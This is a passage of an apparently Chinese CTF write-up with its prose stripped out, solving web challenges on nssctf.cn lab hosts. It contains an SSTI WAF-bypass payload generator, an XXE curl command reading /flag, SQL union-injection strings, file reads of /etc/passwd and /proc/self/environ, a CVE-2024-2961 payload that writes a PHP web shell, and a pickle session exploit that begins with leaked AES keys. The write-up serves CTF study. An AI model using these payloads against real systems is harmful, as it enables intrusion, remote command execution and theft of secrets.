class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = MAX_CONTENT_LENGTH</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_path</span>(<span class="params">basedir, path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.commonpath([basedir,path])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_dangerous_keywords</span>(<span class="params">file_path</span>):</span><br><span class="line">    dangerous_keywords = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = <span class="built_in">str</span>(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> keyword <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> file_content:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment">#  True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">            file.save(save_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File uploaded successfully&quot;</span>,</span><br><span class="line">                <span class="string">&quot;path&quot;</span>: os.path.abspath(save_path)</span><br><span class="line">            &#125;), <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. </span></span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> safe_filename:</span><br><span class="line">            abort(<span class="number">400</span>, description=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. </span></span><br><span class="line">        file_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], safe_filename)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. </span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_safe_path(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path):</span><br><span class="line">            abort(<span class="number">403</span>, description=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. </span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">            abort(<span class="number">404</span>, description=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(suffix)</span><br><span class="line">        <span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> contains_dangerous_keywords(file_path):</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Waf!!!!&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_data = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        tmp_str = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;&#123;name&#125;&lt;/h1&gt;  &lt;!--  --&gt;</span></span><br><span class="line"><span class="string">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!--  --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;footer&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&amp;copy; 2025 &lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/footer&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        abort(<span class="number">500</span>, description=<span class="string">&quot;:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">403</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><strong>+SSTI</strong><br /><code>return</code><code>ALLOWED_EXTENSIONS = &#123;'txt', 'log', 'text','md','jpg','png','gif'&#125;</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>fenjing</strong><strong>payload</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># swafTrue, False</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, <span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p><code>xxx.md</code><code>payload</code><strong><code>/file/xxx.md</code></strong></p><h2 id="_"><a class="markdownIt-Anchor" href="#_"></a> (&gt;&lt;)</h2><p><strong><code>xxe</code></strong><br /><code>curl -X POST http://node2.anna.nssctf.cn:28796/ghctf --data-urlencode 'xml=&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;'</code></p><h2 id="sql"><a class="markdownIt-Anchor" href="#sql"></a> SQL???</h2><p><code>id=1 order by 6</code>5<code>database()</code><strong>sqlite</strong>()</p><p><code>id=1 union select 1,2,3,4,(select sql from sqlite_master)--</code></p><p><code>id=1 union select 1,2,3,4,(select group_concat(flag) from flag)--</code></p><p><code>emmm</code><code>sqlmap</code><code>--random-agent</code></p><h2 id="ez_readfile"><a class="markdownIt-Anchor" href="#ez_readfile"></a> ez_readfile</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>yakit,bp</code><code>SHCTF2024</code><strong>fastcoll</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: a,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/etc/passwd&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><code>file_get_contents</code>5<a href="https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw">cve-2024-2961</a><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185"></a></p><p><a href="https://github.com/kezibei/php-filter-iconv">kezibei</a><br />payload<code>cmd = &quot;echo '&lt;?php system($_GET[\&quot;cmd\&quot;]); ?&gt;' &gt; /var/www/html/shell.php&quot;</code></p><p><code>maps</code><code>libc.so</code>()()</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># maps</span></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/proc/self/maps&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc.so</span></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\CVE\\cve-2024-2961-LFI\\php-filter-iconv\\libc-2.31.so&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(res.content)</span><br></pre></td></tr></table></figure><p><strong>pwn</strong><code>php-filter-iconv.py</code><strong>wsl2+ubuntu22.04</strong><code>payload</code><code>exp</code><strong>url/shell.php?cmd=cat /f</strong>*</p><p><code>wp</code><br /><img src="https://pic1.zhimg.com/80/v2-4acc0d17eeae51da2f768b337c31295c_1440w.png" alt="" /><br /><strong>/docker-entrypoint.sh</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check the environment variables for the flag and assign to INSERT_FLAG</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FLAG </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INSERT_FLAG</span> &gt; /f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/apache2/envvars</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running...&quot;</span> &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -F /var/log/apache2/* &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> apache2 -D FOREGROUND</span><br></pre></td></tr></table></figure><h2 id="ezzzz_pickle"><a class="markdownIt-Anchor" href="#ezzzz_pickle"></a> ezzzz_pickle</h2><p><strong>admin</strong><strong>admin123</strong></p><p><code>POST</code><strong></strong><strong>/app/app.py</strong><br /><strong>session_pickle</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /app/app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, make_response,render_template</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_iv</span>():</span><br><span class="line">    key = os.environ.get(<span class="string">&#x27;SECRET_key&#x27;</span>).encode()</span><br><span class="line">    iv = os.environ.get(<span class="string">&#x27;SECRET_iv&#x27;</span>).encode()</span><br><span class="line">    <span class="keyword">return</span> key, iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line"></span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line"></span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;admin123&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>  </span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    key,iv=generate_key_iv()</span><br><span class="line">    session=aes_encrypt_decrypt(pickled_data, key, iv,mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dowload_file</span>(<span class="params">filename</span>):</span><br><span class="line">    path=os.path.join(<span class="string">&quot;static&quot;</span>,filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_session</span>(<span class="params">cookie</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key, iv = generate_key_iv()</span><br><span class="line">        pickled = aes_encrypt_decrypt(cookie, key, iv,mode=<span class="string">&#x27;decrypt&#x27;</span>)</span><br><span class="line">        pickled_data=base64.b64decode(pickled)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        session_data = pickle.loads(pickled_data)</span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&quot;username&quot;</span>] !=<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> session_data <span class="keyword">if</span> session_data[<span class="string">&quot;expires&quot;</span>] &gt; time.time() <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;session&quot;</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        session = validate_session(request.cookies[<span class="string">&quot;session&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session:</span><br><span class="line">            data=<span class="string">&quot;&quot;</span></span><br><span class="line">            filename=request.form.get(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(filename):</span><br><span class="line">                data=dowload_file(filename)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session[<span class="string">&#x27;username&#x27;</span>],file_data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users.get(username) == password:</span><br><span class="line">            resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line"></span><br><span class="line">            resp.set_cookie(<span class="string">&quot;session&quot;</span>, create_session(username))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>,error=<span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = make_response(redirect(<span class="string">&quot;/login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><code>create_session()</code><strong>session</strong><strong>pickle</strong>+<strong>base64</strong>+<strong>AES</strong></p><p><code>aes</code><strong>keyiv</strong><strong></strong><strong>/proc/self/environ</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PYTHON_SHA256=bfb249609990220491a1b92850a07135ed0831e41738cf681d63cf01b2a8fbd1</span><br><span class="line">HOSTNAME=ab49bc3fc05a4391</span><br><span class="line">PYTHON_VERSION=3.10.16</span><br><span class="line">PWD=/app</span><br><span class="line">HOME=/root</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D</span><br><span class="line">FLAG=no_FLAG</span><br><span class="line">SECRET_key=ajwdopldwjdowpajdmslkmwjrfhgnbbv</span><br><span class="line">SHLVL=1</span><br><span class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">SECRET_iv=asdwdggiouewhgpw</span><br><span class="line">_=/usr/local/bin/flask</span><br><span class="line">OLDPWD=/</span><br></pre></td></tr></table></figure><p><code>exp</code></p><p><strong>shell/</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> 